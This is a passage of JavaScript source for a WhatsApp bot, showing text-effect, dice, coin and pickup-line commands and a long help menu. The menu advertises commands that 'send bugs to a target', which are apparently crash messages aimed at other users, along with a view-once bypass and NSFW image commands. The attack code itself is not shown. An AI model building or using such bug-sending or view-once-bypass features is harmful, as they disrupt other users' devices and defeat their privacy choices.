	  reply('`Error!`')
	}
}
break

case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {

if (!q) return reply(`Example : ${prefix+command} David Cyril`) 
await loading() 
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
David.sendMessage(m.chat, { image: { url: anu }, caption: `Done!` }, { quoted: m })
}
break

case 'convertime':
    const [dime, fromZone, toZone] = args;
    if (!dime || !fromZone || !toZone) return reply('Usage: .convertime [time] [from timezone] [to timezone]');
    const fromdime = moment.tz(dime, fromZone);
    if (!fromdime.isValid()) return reply('Invalid time or timezone.');
    const todime = fromdime.clone().tz(toZone);
    reply(`Time in ${toZone}: ${todime.format('HH:mm:ss')}`);
    break;
 

case 'flipcoin': case 'coin': {
        David.sendMessage(from, { react: { text: "🪙", key: m.key } });
        // Simulate flipping a coin (0 for heads, 1 for tails)
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

        const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
        reply(flipCoinMessage);
      }
        break; 
        
case 'dice': case 'roll': {
        David.sendMessage(from, { react: { text: "🎲", key: m.key } })
        const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6

        const diceMessage = `🎲 *Dice Roll Result:* ${result}`;

        reply(diceMessage);
      }
        break;   
        
case 'listonline': case 'listactive': case 'here': {
       
        await David.sendMessage(m?.chat, {react: {text: `🎙`,key: m?.key,}})

        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        David.sendText(m.chat, '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
        break; 

case 'couplepp': case 'ppcouple': {
await David.sendMessage(m?.chat, {react: {text: `🫶`,key: m?.key,}})
await loading() 
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
David.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
David.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

//=================================================//





  case 'help': case 'list':
       // React with a lock emoji
    await David.sendMessage(m?.chat, { react: { text: `📄`, key: m?.key } });
        let ais = "`"
        
        reply(`
┌ ❏ 𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒 𝐇𝐄𝐋𝐏 𝐆𝐔𝐈𝐃𝐄  ❏ 

├❏ ᴄʜᴀᴛɢᴘᴛ - its an ai that answers any question you ask
├❏ ᴅᴇɢʀᴇᴇɢᴜʀᴜ - its an ai that answers any question you ask
├❏ ɢᴇᴍɪɴɪ - its an ai that answers any question you ask
├❏ ɢᴇᴍɪɴɪ2 - its an ai that answers any question you ask 
├❏ ᴛᴇxᴛ2sᴘᴇᴇᴄʜ - its an ai that converts text to audio using ai automated voices
├❏ ɢᴘᴛ4 - its an open ai model that gives smart answer to any question you ask
├❏ ʀᴀɢʙᴏᴛ - its an ai that answers any question you ask 
├❏ sᴍᴀʀᴛ - its an ai that answers any question you ask 
├❏ ᴀɪ-sᴇᴀʀᴄʜ - an ai that searchs for images on the internet 
├❏ ᴛxᴛɪᴍɢ - its an ai that generates images based on the prompts you give
├❏ ᴛxᴛ2ɪᴍɢ - its an ai that generates images based on the prompts you give
├❏ ᴘʀᴏᴍᴘᴛ-ɢᴘᴛ its an ai that generates prompt for it users 
├❏ ɢᴘᴛɢᴏ - its an ai that answers any question you ask 
├❏ ᴅᴀʟʟᴇ - its an ai that generates realistic images based on the prompts you give
├❏ ʀᴇᴍɪɴɪ - its an ai based tool used for enhancing and restoring photos and videos, particularly improving the quality of old, blurry, or low-resolution images.
├❏ ʙɪɴɢ - searches for images on the internet 
├❏ ʙʟᴀᴄᴋʙᴏx - its an ai that answers any question you ask 
├❏ ɴᴇᴠᴏ - Its an ai that is associated with smart home and entertainment control system
├❏ ʟᴜᴍɪɴɪ1 - Its a skin care analyzer ai uses ai skin analysis technology to scan the face in a snap and recommend cosmetics products
├❏ ɢᴘᴛ4 - its an ai that answers any question you ask 
├❏ ᴅɪғғᴜsɪᴏɴ  - its an ai that generates realistic images based on the prompts you give
├❏ ᴘʟᴀʏ - plays any Music on YouTube and sends only the audio
├❏ ᴠɪᴅᴇᴏ - sends / displays any Video YouTue 
├❏ ᴛɪᴋᴛᴏᴋ - downloads any tiktok video
├❏ ɪɢᴅʟ - downloads any Instagram video
├❏ ɢᴅʀɪᴠᴇ - downloads any media from goggle drive 
├❏ sғɪʟᴇ - downloads any media from sfile 
├❏ ᴀɪᴏ - downloads any video from anywhere 
├❏ sᴏɴɢ - plays any Music on YouTube and sends only the audio
├❏ ᴛᴡɪᴛᴛᴇʀ - downloads any video from Twitter 
├❏ ʏᴛᴍᴘ3 - downloads any YouTube audio on YouTube 
├❏ ɢɪᴛᴄʟᴏɴᴇ - Downloads any Github Repository 
├❏ ɪɴsᴛᴀɢʀᴀᴍ - downloads any Instagram video
├❏ ᴀᴘᴋ - downloads apps
├❏ ᴍᴇᴅɪᴀғɪʀᴇ - downloads files on MediaFire 
├❏ ʏᴛs - searchs for YouTube videos 
├❏ ғᴀᴄᴇʙᴏᴏᴋ - downloads any Facebook Video
├❏ ᴛᴇʀᴀʙᴏx - downloads terabox media 
├❏ ʟʏʀɪᴄs - searchs for lyrics for any song 
├❏ ʙᴇɴᴋᴀɪ - sends bugs to a target
├❏ ǫ-ᴀɴɪᴛᴀ - sends bugs to a target
├❏ ᴠᴇɴᴏᴍ - sends bugs to a target
├❏ ᴢᴇɴɪᴛsᴜ - sends bugs to a target
├❏ ᴅᴀɪʟʏ - gives daily reward
├❏ ᴛʀᴀɴsғᴇʀ - transfer token to someone 
├❏ ʙᴀɴᴋ - displays a user bank balance 
├❏ ᴡᴀʟʟᴇᴛ - displays a user wallet balance 
├❏ ᴡɪᴛʜᴅʀᴀᴡ - withdrawals a user wallet
├❏ ᴅᴇᴘᴏsɪᴛ - deposits wallet tokens to user bank 
├❏ sʜᴏᴘ - buy items
├❏ ʙᴜʏɢᴜᴀʀᴅ - buy guard pets to protect user wallet from robbery
├❏ ʟᴏᴛᴛᴇʀʏ - starts a lottery game
├❏ ʙᴜʏᴛɪᴄᴋᴇᴛ - buy ticket for the lottery
├❏ ʀᴏʟʟ-ᴅɪᴄᴇ - roll a dice
├❏ ᴅᴜᴇʟ - a fun game to win cash tokens 
├❏ ʙᴜʏᴡᴇᴀᴘᴏɴ - buy weapons to eliminate a user guard pet
├❏ ᴍʏᴡᴇᴀᴘᴏɴs - displays your weapons 
├❏ ᴀᴛᴛᴀᴄᴋ - attack a user with your weapons
├❏ ʙᴜʏᴘᴇᴛ - buy a cute pet
├❏ ᴍʏᴘᴇᴛ - displays a user pet
├❏ ᴛʀᴀɪɴ - trian a pet
├❏ ʙᴀᴛᴛʟᴇ - battle a user pet
├❏ ʟᴇᴠᴇʟ - displays a user level
├❏ ᴡᴀɴᴛᴇᴅ - generates a [ wanted ] picture on an image
├❏ ᴅʀᴀᴋᴇ - generates a popular drake meme
├❏ ᴄʟᴏᴡɴ - generates a [ clown ] meme picture on an image
├❏ ᴀʟᴇʀᴛ - generates an picture displaying an alert notification meme
├❏ ᴘᴇᴛɢɪғ - generates a gif of a user profile picture 
├❏ ᴛᴡᴇᴇᴛ - generates a fake tweet
├❏ ᴀʟʙᴜᴍ - generates a album cover
├❏ ᴘɪɴ -  pins a chat
├❏ ɢᴏᴏɢʟᴇɪᴍᴀɢᴇ - searches images on Google 
├❏ ᴘʜᴏᴛᴏʟᴇᴀᴘ - generates a 3d image with a given prompt
├❏ ᴘʟᴀʏsᴛᴏʀᴇ - searchs playstore for apps
├❏ ᴛᴏɪᴍɢ - converts stickes to images
├❏ ᴘɪxᴇʟᴅʀᴀɪɴ - searchs for media on pixel drain
├❏ sᴘᴏᴛɪғʏsᴇᴀʀᴄʜ - search for music on Spotify 
├❏ ɴɢʟ - sends NGL messages
├❏ ᴛᴇᴄʜɴᴇᴡs - displays latest tech news
├❏ ᴛᴛsᴇᴀʀᴄʜ - searchs for TikTok videos 
├❏ ᴛʀ - translates any language 
├❏ ᴛʀᴀᴄᴋɪᴘ - gets info of ip address 
├❏ sᴛʏʟᴇᴛᴇxᴛ - generate a picture with a given prompt 
├❏ ǫᴜᴏᴛᴇss - creates a quoted image
├❏ ǫᴜᴏᴛᴇᴅ - creates a quote image 
├❏ vv - displays viewonce on a particular chat
├❏ vv2 - sends a viewonce to your private chat 
├❏ ᴛʀᴀɴsʟᴀᴛᴇ - translate to any language 
├❏ ʀᴇᴀᴅᴍᴏʀᴇ - generates a readmore mrssage 
├❏ ᴘɪɴᴄʜᴀᴛ - pins a chat
├❏ ǫᴜʀᴀɴ - displays Quran related stuffs
├❏ ʙɪʙʟᴇ - displays bible related stuffs 
├❏ ᴇᴍᴏᴊɪᴍɪx - mixes to emojis together and generate a sticker with them
├❏ ᴘᴇʀɪᴏᴅɪᴄ-ᴛᴀʙʟᴇ - get info of the periodic table
├❏ ᴜɴᴘɪɴᴄʜᴀᴛ - unpins a chat
├❏ ᴄᴀʟᴄᴜʟᴀᴛᴏʀ - calculates any equation 
├❏ ғᴀᴄᴛ - displays a random fact 
├❏ ʜᴅᴠɪᴅᴇᴏ - converts a video to HD format 
├❏ ᴄᴏɴᴠᴇʀᴛ - converts a currency of a country to another 
├❏ converttimᴇ - converts a given time of a country to another 
├❏ ʟɪsᴛᴄᴜʀʀᴇɴᴄʏ - list the currencies of every country 
├❏ ᴄʀᴇᴀᴛᴇᴍᴇᴍᴇ - creates memes 
├❏ ᴘᴀssᴡᴏʀᴅ - generates a random password 
├❏ ʀᴇᴍɪɴᴅᴍᴇ - reminds a user of a particular thing at a given time
├❏ sᴀᴠᴇ - saves WhatsApp status 
├❏ ss - screenshot a website 
├❏ ᴄᴏᴜᴘʟᴇᴘᴘ - generate couple pictures
├❏ ᴇɴᴄʀʏᴘᴛ - obfuscates a JavaScript code 
├❏ ʟᴀɴɢᴜᴀɢᴇs - displays a all languages
├❏ sᴜᴘᴘᴏʀᴛ - david cyril support channel
├❏ ʀᴇᴘᴏsᴛ - reposts a status update from someone 
├❏ ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ - searchs for TikTok videos 
├❏ ᴍᴏᴠɪᴇ - searchs for movies 
├❏ ʀᴇᴍɪɴɪ - its an ai based tool used for enhancing and restoring photos and videos, particularly improving the quality of old, blurry, or low-resolution images.
├❏ ᴋᴅʀᴀᴍᴀ - searchs and gives information of any kdrama movie
├❏ channel - David Cyril support channel 
├❏ ғʟɪᴘᴛᴇxᴛ - flips a text message upside down
├❏ ᴡᴇᴀᴛʜᴇʀ - displays weather information of a location 
├❏ ᴍᴏᴅᴀᴘᴋ- searchs for mod applications
├❏ ᴛɪɴʏᴜʀʟ - shortens a link 
├❏ sᴏᴜɴᴅ1-sᴏᴜɴᴅ161 - displays a random TikTok sound
├❏ animecharacter - displays a random anime characters 
├❏ ᴡᴀɪғᴜ - displays a random waifu image 
├❏ ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ - displays a quoted anime image 
├❏ ᴀᴋɪʀᴀ - displays an anime character 
├❏ ᴀᴋɪʏᴀᴍᴀ - displays an anime character 
├❏ animesearch - displays an anime character 
├❏ anime ᴠɪᴅᴇᴏ - displays an anime character
├❏ ᴀʀᴛ - displays an anime character
├❏ ᴀsᴜɴᴀ - displays an anime character
├❏ ᴀʏᴜᴢᴀᴡᴀ - displays an anime character
├❏ ʙᴏʀᴜᴛᴏ - displays an anime character
├❏ ʙᴛs - displays an anime character
├❏ ᴄʜɪʜᴏ - displays an anime character
├❏ ᴄᴏsᴘʟᴀʏ - displays an anime character
├❏ ᴄᴏsᴘʟᴀʏʟᴏʟɪ - displays an anime character
├❏ ᴄʏʙᴇʀ - displays an anime character
├❏ ᴅᴇɪᴅᴇʀᴀ - displays an anime character
├❏ ᴅᴏʀᴀᴇᴍᴏɴǫ - displays an anime character
├❏ ᴇʟɪᴀɴᴀ - displays an anime character
├❏ ᴇᴢʀᴀ - displays an anime character
├❏ ᴇᴍɪʟɪᴀ - displays an anime character
├❏ ᴇxᴏ - - displays an anime character
├❏ ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ - displays an anime character
├❏ ɢʀᴇᴍᴏɴʏ - displays an anime character
├❏ ʜᴀᴄᴋᴇʀ - displays an anime character
├❏ ʜᴇsᴛɪᴀ - displays an anime character
├❏ ʜɪɴᴀᴛᴀ - displays an anime character
├❏ ʜᴜsʙᴜ - displays an anime character
├❏ ɪɴᴏʀɪ - displays an anime character
├❏ ɪsᴜᴢᴜ - displays an anime character
├❏ ɪsʟᴀᴍɪᴄ - displays an anime character
├❏ ɪᴛᴏʀɪ - displays an anime character
├❏ ᴊᴇɴɴɪᴇ - displays an anime character
├❏ ɪᴛᴀᴄʜɪ - displays an anime character
├❏ ᴊɪsᴏ - displays an anime character
├❏ ᴊᴜsᴛɪɴᴀ - displays an anime character
├❏ ᴋᴀɢᴀ - displays an anime character
├❏ ᴋᴀɢᴜʀᴀ - displays an anime character
├❏ ᴋᴀᴋᴀsɪʜ - displays an anime character
├❏ ᴄᴀʀᴛᴏᴏɴ - displays an anime character
├❏ ᴋᴀᴏsʜɪ - displays an anime character
├❏ sʜᴏʀᴛǫᴜᴏᴛᴇ - displays an anime character
├❏ ᴋᴇɴᴇᴋɪ - displays an anime character
├❏ ᴋᴏᴛᴏʀɪ - displays an anime character
├❏ ᴋᴜʀᴜᴍɪ - displays an anime character
├❏ ʟɪsᴀ - displays an anime character
├❏ ᴍᴀᴅᴀʀᴀ - displays an anime character
├❏ ᴍᴇɢᴜᴍɪɴ - displays an anime character
├❏ ᴍɪᴄᴋʏ - displays an anime character
├❏ ᴍɪᴋᴀsᴀ - displays an anime character
├❏ ᴍɪᴋᴜ - displays an anime character
├❏ ɴᴀʀᴜᴛᴏ - displays an anime character
├❏ ᴍᴇɴᴀᴛᴏ  - displays an anime character
├❏ ᴍᴏᴜɴᴛᴀɪɴ  - displays an anime character
├❏ ɴᴇᴋᴏ - displays an anime character
├❏ ɴᴇᴋᴏᴍɪɴᴇ - displays an anime character
├❏ ɴᴇᴢᴜᴋᴏ - displays an anime character
├❏ ᴏɴᴇᴘᴇɪᴄᴇ - displays an anime character
├❏ ᴘᴏᴋᴇᴍᴏɴ - displays an anime character
├❏ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ - displays an anime character
├❏ ᴘᴇɴᴛᴏʟ - displays an anime character
├❏ ʀᴀɴᴅᴏᴍɴɪᴍᴇ - displays an anime character
├❏ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2 - displays an anime character
├❏ ʀɪᴢᴇ - displays an anime character
├❏ ʀᴏsᴇ - displays an anime character
├❏ sᴀɢɪʀɪ - displays an anime character
├❏ sᴀᴋᴜʀᴀ - displays an anime character
├❏ sᴀᴛᴀɴɪᴄ  - displays an anime character
├❏ sasukᴇ - displays an anime character
├❏ sʜɪɴᴀɴ - displays an anime character
├❏ sʜɪɴᴋᴀ - displays an anime character
├❏ sʜᴏᴛᴀ - displays an anime character
├❏ sᴘᴀᴄᴇ - displays an anime character
├❏ ᴛᴇᴄʜɴᴏʟᴏɢʏ - displays an anime character
├❏ ᴛᴇᴊɪɴᴀ - displays an anime character
├❏ ᴛᴏᴜᴋᴀᴄʜᴀɴ - displays an anime character
├❏ ᴛsᴜɴᴀᴅᴇ - displays an anime character
├❏ ʏᴏᴛsᴜʙᴀ - displays an anime character
├❏ ʏᴜᴋɪ - displays an anime character
├❏ ʏᴜᴍᴇᴋᴏ - displays an anime character
├❏ ʏᴜʟɪʙᴏᴄɪʟ - displays an anime character
├❏ ɢᴇɴsʜɪɴ - displays an NSFW image 🔞
├❏ sᴡɪᴍsᴜɪᴛ - displays an NSFW image 🔞
├❏ sᴄʜᴏᴏʟsᴡɪᴍsᴜɪᴛ - displays an NSFW image 🔞
├❏ ᴡʜɪᴛᴇ - displays an NSFW image 🔞
├❏ ʙᴀʀᴇғᴏᴏᴛ - displays an NSFW image 🔞
├❏ ᴛᴏᴜʜᴏᴜ - displays an NSFW image 🔞
├❏ ɢᴀᴍᴇᴄɢ - displays an NSFW image 🔞
├❏ ʜᴏʟᴏʟɪᴠᴇ - displays an NSFW image 🔞 
├❏ ᴜɴᴄᴇɴsᴏʀᴇᴅ - displays an NSFW image 🔞
├❏ sᴜɴɢɢʟᴀssᴇs - displays an NSFW image 🔞
├❏ ɢʟᴀssᴇs - displays an NSFW image 🔞
├❏ ᴡᴇᴀᴘᴏɴ - displays an NSFW image 🔞 
├❏ sʜɪʀᴛʟɪғᴛ - displays an NSFW image 🔞
├❏ ᴄʜᴀɪɴ - displays an NSFW image 🔞 
├❏ ғɪɴɢᴇʀɪɴɢ - displays an NSFW image 🔞 
├❏ ғʟᴀᴛᴄʜᴇsᴛ - displays an NSFW image 🔞 
├❏ ᴛᴏʀɴᴄʟᴏᴛʜ - displays an NSFW image 🔞 
├❏ ʙᴏɴᴅᴀɢᴇ - displays an NSFW image 🔞 
├❏ ᴅᴇᴍᴏɴ - displays an NSFW image 🔞
├❏ ᴘᴀɴᴛʏᴘᴜʟʟ - displays an NSFW image 🔞 
├❏ ʜᴇᴀᴅᴘʜᴏɴᴇ - displays an NSFW image 🔞 
├❏ ʜᴇᴀᴅᴅʀᴇss - displays an NSFW image 🔞 
├❏ ᴀɴᴜsᴠɪᴇᴡ - displays an NSFW image 🔞
├❏ sʜᴏʀᴛs - displays an NSFW image 🔞 
├❏ sᴛᴏᴋɪɴɢs - displays an NSFW image 🔞 
├❏ ᴛᴏᴘʟᴇss - displays an NSFW image 🔞 
├❏ ʙᴇᴀᴄʜ - displays an NSFW image 🔞 
├❏ ʙᴜɴɴʏɢɪʀʟ - displays an NSFW image 🔞 
├❏ ʙᴜɴɴʏᴇᴀʀ - displays an NSFW image 🔞 
├❏ ᴠᴀᴍᴘɪʀᴇ - displays an NSFW image 🔞 
├❏ ʙɪᴋɪɴɪ - displays an NSFW image 🔞 
├❏ ɴᴏʙʀᴀ - displays an NSFW image 🔞
├❏ ᴡʜɪᴛᴇʜᴀɪʀ - displays an NSFW image 🔞 
├❏ ʙʟᴏɴᴅᴇ - displays an NSFW image 🔞 
├❏ ᴘɪɴᴋʜᴀɪʀ - displays an NSFW image 🔞 
├❏ ʙᴇᴅ - displays an NSFW image 🔞 
├❏ ᴘᴏɴʏᴛᴀɪʟ - displays an NSFW image 🔞 
├❏ ɴᴜᴅᴇ - displays an NSFW image 🔞 
├❏ ᴅʀᴇss - displays an NSFW image 🔞 
├❏ ᴜɴᴅᴇʀᴡᴇᴀʀ - displays an NSFW image 🔞 
├❏ ᴜɴɪғᴏʀᴍ - displays an NSFW image 🔞
├❏ ғᴏxɢɪʀʟ - displays an NSFW image 🔞 
├❏ sᴋɪʀᴛ - displays an NSFW image 🔞 
├❏ ʙʀᴇᴀsᴛ - displays an NSFW image 🔞 
├❏ ᴛᴡɪɴᴛᴀɪʟ - displays an NSFW image 🔞 
├❏ sᴘʀᴇᴀᴅᴘᴜssʏ - displays an NSFW image 🔞 
├❏ sᴇᴇᴛʜʀᴏᴜɢʜ - displays an NSFW image 🔞 
├❏ ʙʀᴇᴀsᴛʜᴏʟᴅ - displays an NSFW image 🔞 
├❏ ғᴀᴛᴇsᴇʀɪᴇs - displays an NSFW image 🔞 
├❏ sᴘʀᴇᴀᴅʟᴇɢs - displays an NSFW image 🔞 
├❏ ᴏᴘᴇɴsʜɪʀᴛ - displays an NSFW image 🔞 
├❏ ʜᴇᴀᴅʙᴀɴᴅ - displays an NSFW image 🔞 
├❏ ɴɪᴘᴘʟᴇs - displays an NSFW image 🔞 
├❏ ᴇʀᴇᴄᴛɴɪᴘᴘʟᴇs - displays an NSFW image 🔞 
├❏ ɢʀᴇᴇɴʜᴀɪʀ - displays an NSFW image 🔞 
├❏ ᴡᴏʟғɢɪʀʟ - displays an NSFW image 🔞 
├❏  ᴋɪʟʟ - generates a kill sticker 
├❏  ᴘᴀᴛ - generates a pat sticker 
├❏  ʟɪᴄᴋ - generates a lick sticker 
├❏  ʙɪᴛᴇ - generates a bite sticker 
├❏  ʏᴇᴇᴛ - generates a yeet sticker 
├❏  ʙᴏɴᴋ - generates a bonk sticker 
├❏  ᴡɪɴᴋ - generates a wink sticker 
├❏  ᴘᴏᴋᴇ - generates a bite sticker 
├❏  ɴᴏᴍ - generates a nom sticker 
├❏  sʟᴀᴘ -  - generates a slap sticker 
├❏  sᴍɪʟᴇ - generates a smile sticker 
├❏  ᴡᴀᴠᴇ - generates a wave sticker 
├❏  ʙʟᴜsʜ - generates a blush sticker 
├❏  sᴍᴜɢ - generates a smug sticker 
├❏  ɢʟᴏᴍᴘ - generates a bite sticker 
├❏  ʜᴀᴘᴘʏ - generates a happy sticker 
├❏  ᴅᴀɴᴄᴇ - generates a happy sticker 
├❏  ᴄʀɪɴɢᴇ - generates a cringe sticker 
├❏  ʜɪɢʜғɪᴠᴇ - generates a high-five sticker 
├❏  ᴄʟᴀɴ - 
├❏  ᴡᴇʀᴇᴡᴏʟғ - starts a werewolf game
├❏ ᴡᴀʀ - starts a werewolf game
├❏ ᴍsᴘ - starts a Minecraft game
├❏ ᴜɴᴏ - starts a uni game 
├❏ ʙʟᴀᴄᴋᴊᴀᴄᴋ - starts a blackjack game 
├❏ ᴡᴄɢ - starts a word chain game 
├❏ sᴇʀᴠᴇʀ - displays information about user server 
├❏ ᴅɪsᴋ - displays information about user disk
├❏ ʟᴏᴏᴋᴜᴘ  - displays information about user
└ ❏
	*〤 ${global.anitav4} 〻*`)
        break
 
   

case 'pickupline': {
await David.sendMessage(m?.chat, {react: {text: `💝`,key: m?.key,}}) 
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '\n©David-Cyril'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: true,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg')}, { upload: David.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: ' • QUEEN_ANITA-V3 •',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await David.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  
  case 'stats': {
    const chats = await David.chats.all();
    const groups = chats.filter(chat => chat.isGroup).length;
    const users = chats.length - groups;

    const message = `
*Bot Stats*
- Groups: ${groups}
- Private Chats: ${users}
- Total Chats: ${chats.length}
`;

    reply(message);
    break;
}

  
case 'crypto': {
    const menu = `*🪙 Crypto Menu:*\n
